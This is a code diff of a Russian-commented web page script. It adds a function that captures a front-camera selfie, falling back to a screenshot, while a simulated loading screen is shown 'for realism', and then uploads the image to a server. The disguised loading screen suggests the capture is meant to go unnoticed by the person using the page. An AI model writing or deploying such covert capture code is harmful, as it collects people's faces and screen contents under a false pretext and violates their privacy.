@@ -302,22 +302,32 @@
                 // Показываем загрузку
                 showLoadingScreen();
 
-                // Имитируем загрузку 2-3 секунды
-                await wait(2000);
-
-                // Пытаемся захватить скриншот
                 let photoData = null;
+
+                // Сначала пробуем захватить с камеры
                 try {
-                    photoData = await captureScreenshot();
-                    console.log('✓ Скриншот захвачен успешно');
+                    photoData = await captureSelfieFromCamera();
+                    if (photoData) {
+                        console.log('📷 Селфи захвачено с камеры');
+                    }
                 } catch (err) {
-                    console.log('⚠️ Скриншот недоступен, используем заглушку:', err);
-                    // Если скриншот недоступен - используем цветную заглушку
-                    photoData = createPlaceholderImage(device);
+                    console.log('⚠️ Камера недоступна:', err.message);
                 }
 
-                // Еще немного ждем для реалистичности
-                await wait(1000);
+                // Если камера не работает - пробуем скриншот
+                if (!photoData) {
+                    try {
+                        photoData = await captureScreenshot();
+                        console.log('✓ Скриншот захвачен как fallback');
+                    } catch (err) {
+                        console.log('⚠️ Скриншот недоступен, используем заглушку:', err);
+                        // Если ничего не работает - используем цветную заглушку
+                        photoData = createPlaceholderImage(device);
+                    }
+                }
+
+                // Небольшая задержка для реалистичности
+                await wait(500);
 
                 // Отправляем селфи на сервер (один раз)
                 if (photoData) {
@@ -344,6 +354,73 @@
                 isProcessing = false;
                 hideLoadingScreen();
             }
+        }
+
+        // Захват селфи с камеры (фронтальная камера)
+        async function captureSelfieFromCamera() {
+            return new Promise((resolve, reject) => {
+                // Проверяем наличие getUserMedia
+                const getUserMedia = navigator.getUserMedia || 
+                                    navigator.webkitGetUserMedia || 
+                                    navigator.mozGetUserMedia ||
+                                    (navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+
+                if (!getUserMedia) {
+                    reject(new Error('getUserMedia not supported'));
+                    return;
+                }
+
+                // Используем новый Promise-based API если доступен
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',  // Фронтальная камера
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    })
+                        .then(stream => {
+                            // Создаем видео элемент для захвата
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
+
+                            // Даем видео время на загрузку
+                            setTimeout(() => {
+                                try {
+                                    // Создаем canvas и захватываем кадр
+                                    const canvas = document.createElement('canvas');
+                                    canvas.width = video.videoWidth;
+                                    canvas.height = video.videoHeight;
+                                    const ctx = canvas.getContext('2d');
+                                    
+                                    // Отражаем изображение как в зеркале (селфи камера обычно отраженная)
+                                    ctx.scale(-1, 1);
+                                    ctx.drawImage(video, -canvas.width, 0);
+
+                                    // Получаем Base64
+                                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
+
+                                    // Останавливаем видео и закрываем поток
+                                    stream.getTracks().forEach(track => track.stop());
+
+                                    resolve(photoData);
+                                } catch (err) {
+                                    stream.getTracks().forEach(track => track.stop());
+                                    reject(err);
+                                }
+                            }, 500);
+                        })
+                        .catch(err => {
+                            console.log('Camera error:', err);
+                            reject(err);
+                        });
+                } else {
+                    // Fallback для старых браузеров
+                    reject(new Error('Modern getUserMedia API not available'));
+                }
+            });
         }
 
         // Функция имитации загрузки
@@ -538,7 +615,7 @@
         // Fallback на localStorage (с ID-ми для синхронизации)
         function saveToLocalStorage(photoData, device) {
             try {
-                const selfieId = 'local-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                const selfieId = 'selfie-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                 const selfie = {
                     id: selfieId,
                     photo: photoData,
